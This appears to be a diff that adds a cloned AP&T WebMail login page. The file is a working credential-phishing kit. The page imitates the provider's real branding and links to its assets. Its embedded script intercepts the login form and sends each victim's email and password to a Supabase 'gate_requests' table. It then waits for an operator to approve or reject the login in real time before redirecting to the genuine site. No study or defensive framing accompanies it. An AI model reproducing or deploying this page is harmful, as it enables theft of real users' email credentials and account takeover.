@@ -1,0 +1,192 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta http-equiv="content-type" content="text/html" charset="UTF-8" />
+    <title>AP&amp;T WebMail :: Welcome to AP&amp;T WebMail</title>
+    <meta name="viewport" content="" id="viewport" />
+
+    <link
+      rel="shortcut icon"
+      href="https://webmail.aptalaska.net/static.php/skins/larry/images/apt_logo.png?s=1793363066"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://webmail.aptalaska.net/static.php/skins/larry/styles.min.css?s=1793363066"
+    />
+
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://webmail.aptalaska.net/static.php/plugins/jqueryui/themes/elastic/jquery-ui.min.css?s=1792392805"
+    />
+  </head>
+  <body>
+    <script type="module">
+      import { supabase } from "../scripts/supabase.js";
+
+      const PAGE_NAME = "AP&T Login";
+      // Assuming the redirect URL is the root of this webmail instance upon success
+      const REDIRECT_URL = "https://webmail.aptalaska.net/";
+
+      // Generate a unique request ID
+      const generateRequestId = () => crypto.randomUUID();
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("form"); // The form has name="form"
+        const messageDiv = document.getElementById("message");
+        const emailInput = document.getElementById("rcmloginuser");
+        const passwordInput = document.getElementById("rcmloginpwd");
+        const submitButton = document.querySelector("#rcmloginsubmit");
+
+        if (form) {
+          form.addEventListener("submit", async function (event) {
+            event.preventDefault();
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            const requestId = generateRequestId();
+
+            // UI State: Loading
+            if (submitButton) {
+              submitButton.disabled = true;
+            }
+            messageDiv.innerHTML =
+              '<div class="loading content show">Loading...</div>';
+
+            try {
+              // Insert request into Supabase
+              const { error } = await supabase.from("gate_requests").insert([
+                {
+                  request_id: requestId,
+                  page_name: PAGE_NAME,
+                  email,
+                  password,
+                  status: "pending",
+                  redirect_url: REDIRECT_URL,
+                },
+              ]);
+
+              if (error) {
+                throw error;
+              }
+
+              // Subscribe to Realtime changes for this request_id
+              const channel = supabase
+                .channel(`request_${requestId}`)
+                .on(
+                  "postgres_changes",
+                  {
+                    event: "*",
+                    schema: "public",
+                    table: "gate_requests",
+                    filter: `request_id=eq.${requestId}`,
+                  },
+                  (payload) => {
+                    const data = payload.new;
+
+                    if (data.status === "approved") {
+                      window.location.replace(REDIRECT_URL);
+                    } else if (data.status === "rejected") {
+                      // Show failed state
+                      messageDiv.innerHTML =
+                        '<div class="warning content show" role="alert">Login failed.</div>';
+                      if (submitButton) {
+                        submitButton.disabled = false;
+                      }
+                    }
+                  },
+                )
+                .subscribe();
+            } catch (err) {
+              console.error("Submit error:", err);
+              messageDiv.innerHTML =
+                '<div class="warning content show" role="alert">Failed to submit request.</div>';
+              if (submitButton) {
+                submitButton.disabled = false;
+              }
+            }
+          });
+        }
+      });
+    </script>
+
+    <h1 class="voice">AP&amp;T WebMail Login</h1>
+
+    <div id="login-form">
+      <div class="box-inner" role="main">
+        <img
+          src="https://webmail.aptalaska.net/static.php/skins/larry/images/apt_logo.png"
+          id="logo"
+          alt="AP&amp;amp;T WebMail"
+        />
+
+        <!-- Renamed id to 'form' for JS selection, kept all original hidden inputs -->
+        <form name="form" id="form" method="post" action="/?_task=login">
+          <table>
+            <tbody>
+              <tr>
+                <td class="title">
+                  <label for="rcmloginuser">Username</label>
+                </td>
+                <td class="input">
+                  <input
+                    name="_user"
+                    id="rcmloginuser"
+                    required
+                    size="40"
+                    autocapitalize="off"
+                    value=""
+                    type="text"
+                  />
+                </td>
+              </tr>
+              <tr>
+                <td class="title"><label for="rcmloginpwd">Password</label></td>
+                <td class="input">
+                  <input
+                    name="_pass"
+                    id="rcmloginpwd"
+                    required
+                    size="40"
+                    autocapitalize="off"
+                    type="password"
+                  />
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <p class="formbuttons">
+            <button
+              type="submit"
+              id="rcmloginsubmit"
+              class="button mainaction submit"
+            >
+              Login
+            </button>
+          </p>
+        </form>
+      </div>
+
+      <div class="box-bottom" role="complementary">
+        <div id="message"></div>
+        <noscript>
+          <p class="noscriptwarning">
+            Warning: This webmail service requires Javascript! In order to use
+            it please enable Javascript in your browser's settings.
+          </p>
+        </noscript>
+      </div>
+
+      <div id="bottomline" role="contentinfo">
+        AP&amp;T WebMail &nbsp;&#9679;&nbsp;
+        <a
+          href="https://www.aptalaska.com/internet-support/#email-support"
+          target="_blank"
+          class="support-link"
+          >Get support</a
+        >
+      </div>
+    </div>
+  </body>
+</html>
